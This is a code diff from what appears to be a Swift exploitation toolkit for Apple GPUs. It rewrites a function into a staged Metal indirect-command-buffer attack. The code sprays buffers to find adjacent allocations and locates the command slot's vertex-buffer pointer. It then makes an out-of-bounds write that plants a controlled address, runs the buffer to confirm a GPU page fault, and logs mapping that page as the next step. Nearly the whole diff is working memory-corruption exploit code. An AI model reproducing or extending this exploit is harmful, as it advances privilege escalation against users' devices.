@@ -2596,30 +2596,35 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
 }
 
 // ── ICB GPU-Address Corruption ────────────────────────────────────────────────
-// Spray GPU-adjacent MTLBuffer pairs; OOB-write a target GPU VA into the hi buf.
-// If the hi buf happens to be (or alias) an ICB slot, the GPU dereferences our VA.
+// Stage 2: Kernelcache cross-ref → ICB slot = 0x40 bytes (IOGPUFamily dominant const).
+// Phase 1: Find adjacent (lo,hi) pair; dump hi[0..63] baseline; locate sentinelBuf VA.
+// Phase 2: Single targeted OOB write at exact vtxBuf field offset with canary VA.
+// Phase 3: Execute ICB — GPU derefs canary → controlled page fault.
 func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async(execute: {
         let sl = SyncLog()
         func step(_ s: String) { sl.write(s); log.append(s) }
 
-        step("── ICB GPU-Address Corruption ──")
+        step("── ICB Targeted vtxBuf Corruption (Stage 2) ──")
         guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
         guard let queue  = device.makeCommandQueue()       else { step("✗ no queue");  completion(); return }
 
-        let BUF_LEN = 4096
+        let BUF_LEN    = 4096
+        let ICB_SLOT   = 64     // 0x40 — dominant struct-size const in IOGPUFamily __TEXT_EXEC (48 uses)
 
-        // Sentinel and target buffers — known GPU VAs, CPU-visible
+        // Sentinel — this VA is what the ICB slot's vtxBuf field should contain
         guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
               let targetBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
             step("✗ buf alloc failed"); completion(); return
         }
         sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
         targetBuf.contents().initializeMemory(as: UInt8.self,   repeating: 0xCC, count: BUF_LEN)
-        step("sentinelBuf gpuVA=0x\(String(sentinelBuf.gpuAddress,radix:16))")
-        step("targetBuf   gpuVA=0x\(String(targetBuf.gpuAddress,  radix:16))")
+        let sentVA    = sentinelBuf.gpuAddress
+        let sentResID = sentinelBuf.gpuResourceID._impl
+        step("sentinelBuf gpuVA=0x\(String(sentVA,radix:16)) resID=0x\(String(sentResID,radix:16))")
+        step("targetBuf   gpuVA=0x\(String(targetBuf.gpuAddress,radix:16))")
 
-        // Shader for ICB draw command
+        // Shader
         let src = """
         #include <metal_stdlib>
         using namespace metal;
@@ -2640,55 +2645,117 @@ func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
             step("✗ PSO failed"); completion(); return
         }
 
-        // Build ICB (storageModeShared → CPU-readable backing)
+        // ICB — storageModeShared so backing is CPU-visible
         let icbDesc = MTLIndirectCommandBufferDescriptor()
-        icbDesc.commandTypes             = [.draw]
-        icbDesc.inheritBuffers           = false
-        icbDesc.maxVertexBufferBindCount = 1
+        icbDesc.commandTypes              = [.draw]
+        icbDesc.inheritBuffers            = false
+        icbDesc.maxVertexBufferBindCount  = 1
         icbDesc.maxFragmentBufferBindCount = 0
         guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
                                                           maxCommandCount: 1,
                                                           options: .storageModeShared) else {
             step("✗ ICB alloc failed"); completion(); return
         }
-        step("ICB resourceID=0x\(String(icb.gpuResourceID._impl, radix: 16))")
+        let icbResID = icb.gpuResourceID._impl
+        step("ICB resID=0x\(String(icbResID,radix:16))")
 
-        // Encode slot 0: 1-vertex point draw, sentinelBuf as vtxBuf[0]
+        // Encode slot 0: sentinelBuf as vtxBuf[0], 1-vertex point draw
         let slot = icb.indirectRenderCommandAt(0)
         slot.setRenderPipelineState(pso)
         slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
         slot.drawPrimitives(.point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
-        step("ICB slot 0 encoded: vtxBuf[0]=sentinelBuf, 1 point draw")
+        step("ICB slot 0 encoded: vtxBuf[0]=sentinelBuf (0x\(String(sentVA,radix:16)))")
 
-        // Spray GPU-adjacent pairs — OOB write target VA into hi buf
-        // Target VA = just past sentinelBuf end (unmapped → GPU fault if dereffed)
-        let tgtVA: UInt64 = sentinelBuf.gpuAddress &+ UInt64(BUF_LEN)
-        step("── GPU adjacency spray (64 pairs) ──")
-        var foundAdj = false
-        for _ in 0..<64 {
+        // ── Phase 1: Find adjacent pair + pre-spray baseline dump ─────────────────
+        step("── Phase 1: adjacency spray + baseline probe ──")
+        var loRef: MTLBuffer? = nil
+        var hiRef: MTLBuffer? = nil
+        for _ in 0..<128 {
             guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
                   let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
             let lo = a.gpuAddress < b.gpuAddress ? a : b
             let hi = a.gpuAddress < b.gpuAddress ? b : a
             guard hi.gpuAddress == lo.gpuAddress &+ UInt64(BUF_LEN) else { continue }
+            loRef = lo; hiRef = hi
             step("✓ adjacent pair: lo=0x\(String(lo.gpuAddress,radix:16)) hi=0x\(String(hi.gpuAddress,radix:16))")
-            // OOB write: from lo's CPU contents, past its end into hi
-            let p = lo.contents().assumingMemoryBound(to: UInt8.self)
-            for off in stride(from: 0, through: BUF_LEN - 8, by: 8) {
-                for bi in 0..<8 { p[BUF_LEN + off + bi] = UInt8((tgtVA >> (bi*8)) & 0xFF) }
-            }
-            step("  OOB wrote tgtVA=0x\(String(tgtVA,radix:16)) to hi buf (all 8B-aligned offsets)")
-            step("  hi buf contents now: tgtVA pattern @ every offset")
-            foundAdj = true; break
+            break
         }
-        if !foundAdj {
-            step("✗ spray miss after 64 pairs")
-            step("  → NEXT: mach_vm_remap to alias ICB backing into attacker range")
+        guard let lo = loRef, let hi = hiRef else {
+            step("✗ spray miss after 128 pairs — no adjacent pair found")
+            step("  → consider mach_vm_remap to alias ICB backing")
+            completion(); return
         }
 
-        // Execute ICB with original (uncorrupted) encoding — baseline confirm
-        step("── ICB baseline execute ──")
-        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm, width: 1, height: 1, mipmapped: false)
+        // Baseline dump: hi[0..63] — looking for ICB slot 0 data
+        let q = hi.contents().assumingMemoryBound(to: UInt8.self)
+        step("── hi[0..63] baseline (pre-spray, ICB slot size=0x\(String(ICB_SLOT,radix:16))) ──")
+        for row in 0..<4 {
+            let base = row * 16
+            var hexStr = ""
+            var ascStr = ""
+            for i in 0..<16 {
+                let b = q[base + i]
+                hexStr += String(format: "%02x ", b)
+                ascStr += (b >= 0x20 && b < 0x7f) ? String(UnicodeScalar(b)) : "."
+            }
+            step("  [+0x\(String(format: "%02x", base))]: \(hexStr) |\(ascStr)|")
+        }
+
+        // Search hi[0..ICB_SLOT-1] for sentinelBuf GPU VA (LE 8-byte)
+        var vtxBufOff: Int? = nil
+        var foundByResID = false
+        for off in 0...(ICB_SLOT - 8) {
+            var vaHit = true, ridHit = true
+            for bi in 0..<8 {
+                if q[off + bi] != UInt8((sentVA    >> (bi * 8)) & 0xFF) { vaHit  = false }
+                if q[off + bi] != UInt8((sentResID >> (bi * 8)) & 0xFF) { ridHit = false }
+            }
+            if vaHit  { vtxBufOff = off; foundByResID = false; break }
+            if ridHit { vtxBufOff = off; foundByResID = true;  break }
+        }
+        // Extended: search full 4096 bytes if slot-range missed
+        if vtxBufOff == nil {
+            step("  sentinel not in slot[0..63] — scanning full hi (4096 bytes)")
+            for off in 0...(BUF_LEN - 8) {
+                var vaHit = true
+                for bi in 0..<8 {
+                    if q[off + bi] != UInt8((sentVA >> (bi * 8)) & 0xFF) { vaHit = false; break }
+                }
+                if vaHit { vtxBufOff = off; break }
+            }
+        }
+
+        if let voff = vtxBufOff {
+            let tag = foundByResID ? "resID" : "gpuVA"
+            step("✓ sentinelBuf \(tag) @ hi[+0x\(String(format:"%x",voff))] → vtxBuf field offset confirmed")
+        } else {
+            step("✗ sentinelBuf VA not found in hi — ICB backing may not be adjacent")
+            step("  will flood full hi as fallback")
+        }
+
+        // ── Phase 2: Targeted OOB write ───────────────────────────────────────────
+        // Canary VA: unmapped, recognisable in fault reports (0xDEADC0DE in high word)
+        let canaryVA: UInt64 = 0xDEAD_C0DE_CAFE_0000
+        step("── Phase 2: targeted OOB write (canaryVA=0x\(String(canaryVA,radix:16))) ──")
+        let p = lo.contents().assumingMemoryBound(to: UInt8.self)
+
+        if let voff = vtxBufOff {
+            // Single precise write at vtxBuf field via OOB past lo's bound
+            for bi in 0..<8 { p[BUF_LEN + voff + bi] = UInt8((canaryVA >> (bi * 8)) & 0xFF) }
+            step("  OOB[lo+BUF_LEN+0x\(String(format:"%x",voff))..+\(voff+7)] ← canaryVA")
+            step("  hi[+0x\(String(format:"%x",voff))] post-write: \(String(format:"%016llx",canaryVA))")
+        } else {
+            // Fallback: flood all 8B-aligned slots in hi with canary
+            for off in stride(from: 0, through: BUF_LEN - 8, by: 8) {
+                for bi in 0..<8 { p[BUF_LEN + off + bi] = UInt8((canaryVA >> (bi * 8)) & 0xFF) }
+            }
+            step("  fallback: flooded hi[0..4095] with canaryVA (all 8B slots)")
+        }
+
+        // ── Phase 3: Execute ICB — GPU should deref canaryVA and fault ────────────
+        step("── Phase 3: ICB execute (vtxBuf → canaryVA) ──")
+        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
+                                                          width: 1, height: 1, mipmapped: false)
         td.usage = [.renderTarget]; td.storageMode = .shared
         guard let dummyTex = device.makeTexture(descriptor: td) else {
             step("✗ dummy tex failed"); completion(); return
@@ -2698,23 +2765,37 @@ func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
         rtDesc.colorAttachments[0].loadAction  = .clear
         rtDesc.colorAttachments[0].storeAction = .store
 
-        guard let cb  = queue.makeCommandBuffer()                      else { step("✗ no cmd buf"); completion(); return }
-        guard let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { step("✗ no encoder"); completion(); return }
+        guard let cb  = queue.makeCommandBuffer()                       else { step("✗ no cmd buf"); completion(); return }
+        guard let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc)  else { step("✗ no encoder"); completion(); return }
         enc.executeCommandsInBuffer(icb, range: 0..<1)
         enc.endEncoding()
         cb.addCompletedHandler { buf in
             if let err = buf.error {
-                step("  ICB ERROR: \(err.localizedDescription)")
-                step("  *** GPU fault — ICB spray hit or prior OOB corrupted state ***")
+                let desc = err.localizedDescription
+                step("  ICB ERROR: \(desc)")
+                if desc.contains("PageFault") || desc.contains("0000000b") {
+                    step("  *** GPU page fault — canaryVA dereffed by GPU ✓ ***")
+                    step("  *** vtxBuf field offset = 0x\(vtxBufOff.map { String($0, radix:16) } ?? "unknown") ***")
+                    step("  *** canaryVA=0x\(String(canaryVA,radix:16)) controlled → next: map canary page ***")
+                } else {
+                    step("  *** unexpected error — check GPU error code ***")
+                }
             } else {
-                step("  ICB completed OK — sentinel buf read successfully")
-                step("  *** next: aim hi buf at ICB slot to corrupt vtxBuf VA ***")
+                step("  ICB completed OK — canaryVA NOT dereffed (no fault)")
+                step("  *** vtxBuf field not corrupted — recheck hi alignment ***")
             }
         }
         cb.commit()
         cb.waitUntilCompleted()
 
-        step("── ICB Corruption complete ──────────────")
+        // Post-exec: dump hi[vtxBufOff] to confirm canary still there
+        if let voff = vtxBufOff {
+            var postHex = ""
+            for bi in 0..<8 { postHex += String(format: "%02x ", q[voff + bi]) }
+            step("  post-exec hi[+0x\(String(format:"%x",voff))]: \(postHex)(expect canary bytes)")
+        }
+
+        step("── ICB Stage 2 complete ──────────────")
         completion()
     })
 }
